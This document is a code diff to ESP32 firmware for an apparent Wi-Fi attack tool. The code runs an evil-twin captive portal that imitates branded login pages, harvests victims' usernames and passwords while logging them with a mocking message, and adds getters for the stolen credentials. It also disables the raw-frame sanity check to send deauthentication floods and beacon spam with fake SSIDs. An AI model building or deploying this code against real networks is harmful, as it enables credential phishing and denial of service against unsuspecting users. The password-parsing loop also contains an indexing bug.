@@ -1,5 +1,5 @@
 /*
-Copyright (c) 2022 kl0ibi
+Copyright (c) 2023 kl0ibi
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -21,16 +21,18 @@ SOFTWARE.
  */
 #include <string.h>
 #include "htool_wifi.h"
+#include "esp_err.h"
+#include "esp_wifi_types.h"
 #include "htool_display.h"
 #include "htool_api.h"
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
 #include "esp_system.h"
-#include "esp_spi_flash.h"
+//#include "esp_spi_flash.h"
 #include "lwip/sockets.h"
 #include "lwip/err.h"
 #include "esp_netif.h"
-
+#include "htool_nvsm.h"
 #include "lwip/err.h"
 #include "lwip/sockets.h"
 #include "lwip/sys.h"
@@ -87,6 +89,7 @@ extern const char html_vodafone_end[]   asm("_binary_vodafone_html_end");
 
 const int WIFI_SCAN_FINISHED_BIT = BIT0;
 const int WIFI_CONNECTED = BIT1;
+const int WIFI_DISCONNECTED = BIT2;
 
 static TaskHandle_t htask;
 
@@ -110,13 +113,16 @@ bool perform_passive_scan = false;
 
 bool scan_manually_stopped = false;
 
-wchar_t username1[22] = {0};
-wchar_t username2[22] = {0};
-wchar_t username3[22] = {0};
-wchar_t username4[22] = {0};
-wchar_t password[64] = {0};
+#define MAX_USER_LEN 120
+#define MAX_PW_LEN 64
 
-char funny_ssids[24][32] = {"Two Girls One Router", "I'm Watching You", "Mom Use This One", "Martin Router King", "Never Gonna Give You Up", "VIRUS.EXE", "All Your Bandwidth Belong to Us", "Byte Me", "Never Gonna Give You Wifi", "The Password is...",
+static char cred_user[MAX_USER_LEN];
+static char cred_pw[MAX_PW_LEN];
+static uint32_t cred_pw_len = 0;
+static uint32_t cred_user_len = 0;
+
+
+const char funny_ssids[24][32] = {"Two Girls One Router", "I'm Watching You", "Mom Use This One", "Martin Router King", "Never Gonna Give You Up", "VIRUS.EXE", "All Your Bandwidth Belong to Us", "Byte Me", "Never Gonna Give You Wifi", "The Password is...",
                             "Girls Gone Wireless", "Vladimir Routin", "Try Me", "Definitely Not Wi-Fi", "Click and Die", "Connecting...", "Use at your own risk", "99 problems but Wi-Fi Aint One", "FreeVirus", "You are hacked!", "Next time lock your router",
                             "For Porn Use Only", "You Pay Now", "I can read your emails"};
 
@@ -132,7 +138,7 @@ beacon_task_args_t beacon_task_args;
 #define QD_TYPE_A (0x0001)
 #define ANS_TTL_SEC (300)
 
-extern int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) { //redifned to override the check
+extern int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) { //redefined to override the check
     return 0;
 }
 
@@ -169,6 +175,29 @@ typedef struct sockaddr_in sockaddr_in_t;
 
 httpd_handle_t server;
 int sock = 0;
+
+
+void htool_wifi_reset_creds() {
+    cred_user_len = 0;
+    cred_pw_len = 0;
+}
+
+char *htool_wifi_get_pw_cred() {
+    return cred_pw;
+}
+
+char *htool_wifi_get_user_cred() {
+    return cred_user;
+}
+
+
+uint32_t htool_wifi_get_pw_cred_len() {
+    return cred_pw_len;
+}
+
+uint32_t htool_wifi_get_user_cred_len() {
+    return cred_user_len;
+}
 
 esp_err_t common_get_handler(httpd_req_t *req) {
     uint32_t len = 0;
@@ -255,6 +284,7 @@ esp_err_t common_get_handler(httpd_req_t *req) {
             else {
                 httpd_resp_set_hdr(req, "Location", "http://mcdonalds.com");
             }
+            //TODO: add apple location
         }
         else {
             httpd_resp_set_hdr(req, "Location", "http://192.168.8.1");
@@ -271,76 +301,42 @@ esp_err_t common_get_handler(httpd_req_t *req) {
             }
             if (httpd_req_get_url_query_str(req, buf, buf_len) == ESP_OK) {
                 ESP_LOGI(TAG, "Idiot gave credentials %s", buf);
-                bool username_reached = false;
-
-                uint8_t pw_index = 0;
-
-                uint8_t offset = 5;
-                for (uint8_t i = 0; i < strlen(buf); i++) {
-                    if (!username_reached) {
-                        if (buf[i+offset] == '%') {
-                            if (i < 20) { //TODO: to this username splitting later at display cuz of performance
-                                username1[i] = '@';
-                            }
-                            else if (i < 40) {
-                                username2[i-20] = '@';
-                            }
-                            else if (i < 60) {
-                                username3[i-40] = '@';
-                            }
-                            else if (i < 80) {
-                                username4[i-60] = '@';
-                            }
-                            offset = offset + 2;
-                            continue;
-                        }
-                        else if (buf[i+offset] != '&') {
-                            if (i < 20) {
-                                username1[i] = buf[i+offset];
-                                username2[0] = 0;
-                                username3[0] = 0;
-                                username4[0] = 0;
-                            }
-                            else if (i < 40) {
-                                username2[i-20] = buf[i+offset];
-                            }
-                            else if (i < 60) {
-                                username3[i-40] = buf[i+offset];
-                            }
-                            else if (i < 80) {
-                                username4[i-60] = buf[i+offset];
-                            }
-                        }
-                        else {
-                            username_reached = true;
-                            offset = 12;
-                            if (i < 20) {
-                                username1[i] = '\0';
-                            }
-                            else if (i < 40) {
-                                username2[i-20] = '\0';
-                            }
-                            else if (i < 60) {
-                                username3[i-40] = '\0';
-                            }
-                            else if (i < 80) {
-                                username4[i-60] = '\0';
-                            }
-                            pw_index = i+1;
-                        }
+                uint32_t i = 5;
+                cred_user_len = 0;
+                cred_pw_len = 0;
+                while (i < buf_len && cred_user_len < MAX_USER_LEN) {
+                    if (buf[i] == '%') {
+                        i += 3;
+                        cred_user[cred_user_len] = '@';
+                        cred_user_len++;
+                    }
+                    else if (buf[i] == '&') {
+                        cred_user[cred_user_len] = '\0';
+                        cred_user_len++;
+                        break;
                     }
                     else {
-                        if (buf[i+offset] == '%') {
-                            password[i-pw_index] = '@';
-                            offset = offset + 2;
-                        }
-                        if (buf[i+offset] != '&') {
-                            password[i-pw_index] = buf[i+offset];
-                        }
-                        else {
-                            password[i-pw_index] = '\0';
-                            break;
-                        }
+                        cred_user[cred_user_len] = buf[i];
+                        cred_user_len++;
+                        i++;
+                    }
+                }
+                i += 6;
+                while (i < buf_len && cred_pw_len < MAX_PW_LEN) {
+                    if (buf[i] == '%') {
+                        i += 3;
+                        cred_pw[cred_user_len] = '@';
+                        cred_pw_len++;
+                    }
+                    else if (buf[i] == '&') {
+                        cred_pw[cred_pw_len] = '\0';
+                        cred_pw_len++;
+                        break;
+                    }
+                    else {
+                        cred_pw[cred_pw_len] = buf[i];
+                        cred_pw_len++;
+                        i++;
                     }
                 }
             }
@@ -487,8 +483,7 @@ static int parse_dns_request(char *req, size_t req_len, char *dns_reply, size_t 
     memcpy(dns_reply, req, req_len);
 
     dns_header_t *header = (dns_header_t *)dns_reply;
-    ESP_LOGD(TAG, "DNS query with header id: 0x%X, flags: 0x%X, qd_count: %d",
-             ntohs(header->id), ntohs(header->flags), ntohs(header->qd_count));
+    ESP_LOGD(TAG, "DNS query with header id: 0x%X, flags: 0x%X, qd_count: %d", ntohs(header->id), ntohs(header->flags), ntohs(header->qd_count));
 
     if ((header->flags & OPCODE_MASK) != 0) {
         return 0;
@@ -686,7 +681,7 @@ void htool_wifi_captive_portal_start(void *pvParameters) {
     xTaskCreatePinnedToCore(httpd_server_task, "http_server", 4096, NULL, 5, NULL, 0);
 }
 
-void htool_wifi_captive_portal_stop(void *pvParameters) {
+void htool_wifi_captive_portal_stop() {
     httpd_unregister_uri_handler(server, "/*", 1);
     httpd_stop(server);
     cp_running = false; //closes the dns server
@@ -847,7 +842,7 @@ void beacon_spammer() {
                 if (ssid_index == global_scans_count) {
                     ssid_index = 0;
                 }
-                send_router_beacon_frame_random_mac(menu_cnt);
+                send_router_beacon_frame_random_mac(ssid_index);
             }
             else {
                 send_router_beacon_frame_random_mac(menu_cnt);
@@ -925,7 +920,6 @@ void htool_wifi_send_disassociate_frame(uint8_t num, bool sta) {
 
 void htool_wifi_send_deauth_frame(uint8_t num, bool sta) {
     if (esp_wifi_set_channel(global_scans[num].primary, global_scans[num].second) != ESP_OK) {
-        ESP_LOGI(TAG, "TARGET is connectiong");
         target_connected = true;
     }
 
@@ -949,13 +943,11 @@ void htool_wifi_send_deauth_frame(uint8_t num, bool sta) {
         esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
         esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
         esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
-        ESP_LOGI(TAG, "Deauth sent: %s %d %d %d", global_scans[num].ssid, global_scans[num].primary, global_scans[num].second, num);
     }
     else {
         esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
         esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
         esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
-        ESP_LOGI(TAG, "Deauth sent: %s %d %d %d", global_scans[num].ssid, global_scans[num].primary, global_scans[num].second, num);
     }
 }
 
@@ -975,7 +967,6 @@ void deauther_task() {
         }
         vTaskDelay(pdMS_TO_TICKS(10));
     }
-    ESP_LOGI(TAG, "Deauther Task stopped");
     vTaskDelete(NULL);
 }
 
@@ -985,7 +976,7 @@ void htool_wifi_start_deauth() {
         scan_manually_stopped = true;
         esp_wifi_scan_stop();
     }
-    xTaskCreatePinnedToCore(deauther_task, "deauth", 4096, NULL, 1, NULL, 0);
+    xTaskCreatePinnedToCore(deauther_task, "deauth", 1024, NULL, 1, NULL, 0);
 }
 
 void htool_wifi_start_active_scan() {
@@ -1018,8 +1009,7 @@ static void wifi_handling_task(void *pvParameters) {
                 htool_set_wifi_sta_config();
             }
             xEventGroupClearBits(wifi_client->status_bits, WIFI_SCAN_FINISHED_BIT);
-            uxBits = xEventGroupWaitBits(wifi_client->status_bits, WIFI_SCAN_FINISHED_BIT, pdTRUE, pdFALSE,
-                                         pdMS_TO_TICKS(1500));
+            uxBits = xEventGroupWaitBits(wifi_client->status_bits, WIFI_SCAN_FINISHED_BIT, pdTRUE, pdFALSE, pdMS_TO_TICKS(2000));
             if ((uxBits & WIFI_SCAN_FINISHED_BIT) != 0) {
                 ESP_LOGI(TAG, "Scan finished");
                 if (scan_manually_stopped) {
@@ -1097,18 +1087,57 @@ static void event_handler(void *arg, esp_event_base_t event_base, int32_t event_
         ESP_LOGW(TAG, "Disconnected. Reason: %d", reason);
         if (reason != WIFI_REASON_ASSOC_LEAVE) {
             wifi_client->wifi_connected = false;
+            xEventGroupSetBits(wifi_client->status_bits, WIFI_DISCONNECTED);
         }
     }
     else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_CONNECTED) {
         ESP_LOGI(TAG, "WIFI_EVENT_STA_CONNECTED");
-        wifi_client->wifi_connected = true;
-        xEventGroupSetBits(wifi_client->status_bits, WIFI_CONNECTED);
     }
     else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
         ESP_LOGI(TAG, "IP_EVENT_STA_GOT_IP");
         ip_event_got_ip_t *event = (ip_event_got_ip_t *)event_data;
         ESP_LOGI(TAG, "got ip:%s", ip4addr_ntoa((const ip4_addr_t *)&event->ip_info.ip));
+        wifi_client->wifi_connected = true;
+        xEventGroupSetBits(wifi_client->status_bits, WIFI_CONNECTED);
     }
+}
+
+bool htool_wifi_is_wifi_connected() {
+    return wifi_client->wifi_connected;
+}
+
+uint8_t htool_wifi_connect() {
+    EventBits_t uxBits;
+    xEventGroupClearBits(wifi_client->status_bits, WIFI_CONNECTED | WIFI_DISCONNECTED);
+    esp_wifi_connect();
+    uxBits = xEventGroupWaitBits(wifi_client->status_bits, WIFI_CONNECTED | WIFI_DISCONNECTED, true, false, pdMS_TO_TICKS(8000));
+    if (uxBits & WIFI_CONNECTED) {
+        return HTOOL_OK;
+    }
+    else {
+        return HTOOL_ERR_WIFI_NOT_CONNECT;
+    }
+}
+
+
+void htool_wifi_disconnect() {
+    if (wifi_client->wifi_connected) {
+        esp_wifi_disconnect();
+        wifi_client->wifi_connected = false;
+    }
+}
+
+
+void htool_wifi_setup_station(uint8_t ssid_index, char* password) {
+    esp_wifi_stop();
+    wifi_config_t config = {0};
+    config.sta.scan_method = WIFI_ALL_CHANNEL_SCAN;
+    config.sta.sort_method = WIFI_CONNECT_AP_BY_SIGNAL;
+    strncpy((char *)config.sta.ssid, (char *)global_scans[ssid_index].ssid, 32);
+    strncpy((char *)config.sta.password, password, 32);
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    esp_wifi_set_config(ESP_IF_WIFI_STA, &config);
+    esp_wifi_start();
 }
 
 void htool_set_wifi_sta_config() {
@@ -1121,6 +1150,13 @@ void htool_set_wifi_sta_config() {
     esp_wifi_start();
 }
 
+esp_netif_t *htool_wifi_get_current_netif() {
+    if (!wifi_client) {
+        return NULL;
+    }
+
+    return wifi_client->esp_netif;
+}
 
 void htool_wifi_start() {
     if (esp_wifi_start() != ESP_OK) {
@@ -1131,6 +1167,30 @@ void htool_wifi_start() {
                           NULL, 6, &htask, PRO_CPU_NUM);
 }
 
+void htool_wifi_deinit() {
+    if (htask) vTaskDelete(htask);
+
+    ESP_LOGD(TAG, "Unregister events.");
+    esp_event_handler_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, &event_handler);
+    esp_event_handler_unregister(IP_EVENT, IP_EVENT_STA_GOT_IP, &event_handler);
+
+    ESP_LOGD(TAG, "Disconnect wifi");
+    esp_wifi_disconnect();
+    ESP_LOGD(TAG, "Stop wifi");
+    esp_wifi_stop();
+    ESP_LOGD(TAG, "Deinit wifi");
+    esp_wifi_deinit();
+
+    if (wifi_client) {
+        vEventGroupDelete(wifi_client->status_bits);
+        if (wifi_client->esp_netif) {
+            esp_netif_destroy(wifi_client->esp_netif);
+        }
+        FREE_MEM(wifi_client);
+    }
+}
+
+
 int htool_wifi_init() {
     wifi_client = calloc(1, sizeof(htool_wifi_client_t));
     if (wifi_client == NULL) {
@@ -1138,28 +1198,20 @@ int htool_wifi_init() {
         return HTOOL_ERR_MEMORY;
     }
     wifi_client->status_bits = xEventGroupCreate();
-    esp_err_t err = nvs_flash_init();
-    if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND)
-    {
-        ESP_ERROR_CHECK(nvs_flash_erase());
-        err = nvs_flash_init();
-    }
-    ESP_ERROR_CHECK(err);
+    nvsm_init();
 
     ESP_ERROR_CHECK(esp_netif_init());
-
-    esp_netif_t *ap_netif = esp_netif_create_default_wifi_ap();
-    assert(ap_netif);
-
+    wifi_client->esp_netif = esp_netif_create_default_wifi_ap();
     esp_netif_ip_info_t ip_info;
 
     IP4_ADDR(&ip_info.ip, 124, 213, 16, 29); // for smartphones use public ip
     IP4_ADDR(&ip_info.gw, 124, 213, 16, 29);
     IP4_ADDR(&ip_info.netmask, 255, 0, 0, 0);
-    esp_netif_dhcps_stop(ap_netif);
-    esp_netif_set_ip_info(ap_netif, &ip_info);
-    esp_netif_dhcps_start(ap_netif);
-    esp_netif_set_hostname(ap_netif, CONFIG_LWIP_LOCAL_HOSTNAME);
+    esp_netif_dhcps_stop(wifi_client->esp_netif);
+    esp_netif_set_ip_info(wifi_client->esp_netif, &ip_info);
+    esp_netif_dhcps_start(wifi_client->esp_netif);
+    esp_netif_set_hostname(wifi_client->esp_netif, CONFIG_LWIP_LOCAL_HOSTNAME);
+    wifi_client->esp_netif = esp_netif_create_default_wifi_sta();
 
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     ESP_ERROR_CHECK(esp_wifi_init(&cfg));
@@ -1168,11 +1220,11 @@ int htool_wifi_init() {
 
     esp_wifi_set_channel(0, WIFI_SECOND_CHAN_NONE);
 
-    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));
+    //ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE)); //TODO: ble check
 
     esp_wifi_set_promiscuous(true);
 
-    esp_wifi_set_max_tx_power(82);
+    //esp_wifi_set_max_tx_power(82); //TODO: ble check
 
    wifi_country_t ccconf = {
             .cc = "00", // worldwide setting
@@ -1186,6 +1238,7 @@ int htool_wifi_init() {
     }
 
     ESP_ERROR_CHECK(esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &event_handler, NULL));
+    ESP_ERROR_CHECK(esp_event_handler_register(IP_EVENT, IP_EVENT_STA_GOT_IP, &event_handler, NULL));
 
     return HTOOL_OK;
 }
